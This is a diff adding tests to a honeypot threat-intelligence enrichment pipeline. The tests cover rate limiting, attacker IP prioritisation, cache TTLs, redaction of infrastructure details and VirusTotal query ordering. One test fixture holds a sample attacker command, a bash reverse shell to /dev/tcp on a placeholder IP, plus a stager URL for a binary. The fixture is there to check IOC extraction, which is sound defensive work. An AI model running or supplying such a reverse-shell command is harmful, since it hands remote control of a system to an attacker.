@@ -1501,6 +1501,7 @@ class TestEnrichmentIOCOrdering:
             iocs: list[str],
             cache: sqlite3.Connection,
             errors: ErrorAccumulator,
+            **_kwargs: object,
         ) -> tuple[list[EnrichmentResult], int]:
             call_log.append((provider_name, ioc_type))
             return [], 0
@@ -1628,6 +1629,7 @@ class TestDionaeaBinarySynthesisSchema:
             iocs: list[str],
             cache: sqlite3.Connection,
             errors: ErrorAccumulator,
+            **_kwargs: object,
         ) -> tuple[list[EnrichmentResult], int]:
             return [], 0
 
@@ -1703,3 +1705,234 @@ def test_init_cache_prunes_expired_rows_and_sets_wal(tmp_path: Path) -> None:
     remaining = [row[0] for row in reopened.execute("SELECT ioc_value FROM cache").fetchall()]
     reopened.close()
     assert remaining == ["198.51.100.2"]
+
+
+class TestV15RunnerUpgrades:
+    """v1.5 enrichment upgrades: token-bucket pacing, behavioral priority, optional keys,
+    unified VT/GTI priority queue, URL cache TTL, and infra-string error scrubbing."""
+
+    @pytest.mark.asyncio()
+    async def test_async_rate_limiter_enforces_vt_4_per_minute(self) -> None:
+        from lantana.enrichment.runner import _AsyncRateLimiter
+
+        now = [0.0]
+        sleeps: list[float] = []
+
+        def fake_clock() -> float:
+            return now[0]
+
+        async def fake_sleep(seconds: float) -> None:
+            sleeps.append(seconds)
+            now[0] += seconds
+
+        limiter = _AsyncRateLimiter(4, 60, clock=fake_clock, sleep=fake_sleep)
+        for _ in range(4):
+            await limiter.acquire()
+        assert sleeps == []  # 4-token initial burst passes immediately
+
+        await limiter.acquire()
+        assert len(sleeps) == 1
+        assert sleeps[0] == pytest.approx(15.0)
+
+    def test_behavioral_priority_ranks_c2_and_interactive_above_scanners(self) -> None:
+        from lantana.enrichment.runner import _compute_ip_priority
+
+        cowrie = pl.DataFrame(
+            {
+                "src_ip": ["203.0.113.99", "203.0.113.50", "198.51.100.1"],
+                "eventid": [
+                    "cowrie.session.file_download",
+                    "cowrie.command.input",
+                    "cowrie.login.failed",
+                ],
+            }
+        )
+        nft = pl.DataFrame({"src_ip": ["192.0.2.1"] * 50})
+        prio = _compute_ip_priority(
+            {"cowrie": cowrie, "nftables": nft},
+            c2_ips={"203.0.113.200"},
+        )
+        selected = _select_ips_for_provider(
+            "abuseipdb",
+            ["192.0.2.1", "198.51.100.1", "203.0.113.50", "203.0.113.99", "203.0.113.200"],
+            {"192.0.2.1": 50},
+            priority_map=prio,
+        )
+        assert selected == [
+            "203.0.113.200",  # C2 IP first
+            "203.0.113.99",  # file_download
+            "203.0.113.50",  # command
+            "198.51.100.1",  # auth
+            "192.0.2.1",  # chatty port scanner last
+        ]
+
+    def test_url_cache_ttl_90d_malicious_7d_benign(self) -> None:
+        from lantana.enrichment.runner import CACHE_TTL_MALICIOUS_URL_DAYS, IOC_TYPE_URL
+
+        assert _classify_ttl("virustotal", IOC_TYPE_URL, {"vt_url_risk_score": 75.0}) == timedelta(
+            days=CACHE_TTL_MALICIOUS_URL_DAYS
+        )
+        assert _classify_ttl("virustotal", IOC_TYPE_URL, {"vt_url_risk_score": 0.0}) == timedelta(
+            days=CACHE_TTL_BENIGN_DAYS
+        )
+
+    def test_sanitize_error_message_scrubs_infra_ips_and_hostnames(self) -> None:
+        from lantana.common.redact import RedactionConfig
+
+        cfg = RedactionConfig(
+            infrastructure_ips=["203.0.113.97"],
+            infrastructure_cidrs=[],
+            pseudonym_map={"203.0.113.97": "honeypot-wan"},
+            infrastructure_hostnames=["vps-op.example.net"],
+        )
+        raw = (
+            "Error for https://api.shodan.io/host/203.0.113.97?key=SECRET "
+            "on 97.ip-203-0-113 vps-op.example.net"
+        )
+        out = _sanitize_error_message(raw, redact_config=cfg)
+        assert "SECRET" not in out
+        assert "203.0.113.97" not in out
+        assert "97.ip-203-0-113" not in out
+        assert "vps-op.example.net" not in out
+        assert "key=REDACTED" in out
+        assert "honeypot-wan" in out
+        assert "honeypot-host" in out
+
+    @pytest.mark.asyncio()
+    async def test_zero_key_mode_skips_all_providers_without_errors(self, tmp_path: Path) -> None:
+        from lantana.common.config import (
+            OperationConfig,
+            OperatorConfig,
+            RedactConfig,
+            ReportingConfig,
+            SecretsConfig,
+            SharingConfig,
+        )
+        from lantana.enrichment.runner import run_enrichment
+
+        secrets = SecretsConfig()  # All optional provider keys None
+        reporting = ReportingConfig(
+            operator=OperatorConfig(
+                name="op", handle="op", contact="op@example.com", pgp_fingerprint=""
+            ),
+            sharing=SharingConfig(tlp="GREEN", community="", discord_channel=""),
+            operation=OperationConfig(
+                name="op_zero", description="", sector="", region="", start_date="2026-06-18"
+            ),
+            redact=RedactConfig(),
+        )
+        bronze = pl.DataFrame(
+            {
+                "src_ip": ["203.0.113.5"],
+                "eventid": ["cowrie.login.failed"],
+                "timestamp": [datetime(2026, 6, 18, 12, 0, 0)],
+                "server": ["sn-test"],
+            }
+        )
+        written: list[pl.DataFrame] = []
+
+        def _capture_silver(df: pl.DataFrame, *_args: object, **_kwargs: object) -> Path:
+            written.append(df)
+            return tmp_path / "out.parquet"
+
+        with (
+            patch("lantana.enrichment.runner.load_secrets", return_value=secrets),
+            patch("lantana.enrichment.runner.load_reporting", return_value=reporting),
+            patch(
+                "lantana.enrichment.runner.read_bronze_ndjson",
+                side_effect=lambda _d, dataset: bronze if dataset == "cowrie" else pl.DataFrame(),
+            ),
+            patch(
+                "lantana.enrichment.runner.write_silver_partition",
+                side_effect=_capture_silver,
+            ),
+        ):
+            await run_enrichment(
+                target_date=date(2026, 6, 18),
+                cache_db_path=tmp_path / "cache.db",
+                sensor_dir=tmp_path / "sensor",
+                errors_path=tmp_path / "errors.json",
+                provider_state_path=tmp_path / "state.json",
+            )
+        assert not (tmp_path / "errors.json").exists()
+        assert len(written) == 1
+        assert "abuseipdb_risk_score" in written[0].columns
+
+    @pytest.mark.asyncio()
+    async def test_unified_vt_queue_order_hashes_c2_urls_domains_inbound(
+        self, tmp_path: Path
+    ) -> None:
+        from lantana.common.config import (
+            OperationConfig,
+            OperatorConfig,
+            RedactConfig,
+            ReportingConfig,
+            SecretsConfig,
+            SharingConfig,
+        )
+        from lantana.enrichment.runner import IOC_TYPE_URL, run_enrichment
+
+        secrets = SecretsConfig(vault_apikey_virustotal="SYNTHETIC_TEST_VT_000000")
+        reporting = ReportingConfig(
+            operator=OperatorConfig(
+                name="op", handle="op", contact="op@example.com", pgp_fingerprint=""
+            ),
+            sharing=SharingConfig(tlp="GREEN", community="", discord_channel=""),
+            operation=OperationConfig(
+                name="op_vt", description="", sector="", region="", start_date="2026-06-18"
+            ),
+            redact=RedactConfig(),
+        )
+        bronze = pl.DataFrame(
+            {
+                "src_ip": ["203.0.113.5", "203.0.113.5"],
+                "eventid": ["cowrie.session.file_download", "cowrie.command.input"],
+                "shasum": ["a" * 64, None],
+                "url": ["http://stager.example.org/bin.elf", None],
+                "input": [None, "bash -i >& /dev/tcp/198.51.100.77/4444 0>&1"],
+                "timestamp": [
+                    datetime(2026, 6, 18, 12, 0, 0),
+                    datetime(2026, 6, 18, 12, 1, 0),
+                ],
+                "server": ["sn-test", "sn-test"],
+            }
+        )
+        stage_log: list[tuple[str, list[str]]] = []
+
+        async def fake_enrich(
+            provider_name: str,
+            provider: object,
+            ioc_type: str,
+            iocs: list[str],
+            cache: sqlite3.Connection,
+            errors: ErrorAccumulator,
+            **_kwargs: object,
+        ) -> tuple[list[EnrichmentResult], int]:
+            stage_log.append((ioc_type, list(iocs)))
+            return [], 0
+
+        with (
+            patch("lantana.enrichment.runner.load_secrets", return_value=secrets),
+            patch("lantana.enrichment.runner.load_reporting", return_value=reporting),
+            patch(
+                "lantana.enrichment.runner.read_bronze_ndjson",
+                side_effect=lambda _d, dataset: bronze if dataset == "cowrie" else pl.DataFrame(),
+            ),
+            patch("lantana.enrichment.runner._enrich_iocs_with_provider", side_effect=fake_enrich),
+            patch("lantana.enrichment.runner.normalize_dataset", return_value=pl.DataFrame()),
+        ):
+            await run_enrichment(
+                target_date=date(2026, 6, 18),
+                cache_db_path=tmp_path / "cache.db",
+                sensor_dir=tmp_path / "sensor",
+                errors_path=tmp_path / "errors.json",
+                provider_state_path=tmp_path / "state.json",
+            )
+
+        assert stage_log == [
+            (IOC_TYPE_HASH, ["a" * 64]),
+            (IOC_TYPE_IP, ["198.51.100.77"]),
+            (IOC_TYPE_URL, ["http://stager.example.org/bin.elf"]),
+            (IOC_TYPE_DOMAIN, ["stager.example.org"]),
+            (IOC_TYPE_IP, ["203.0.113.5"]),
+        ]
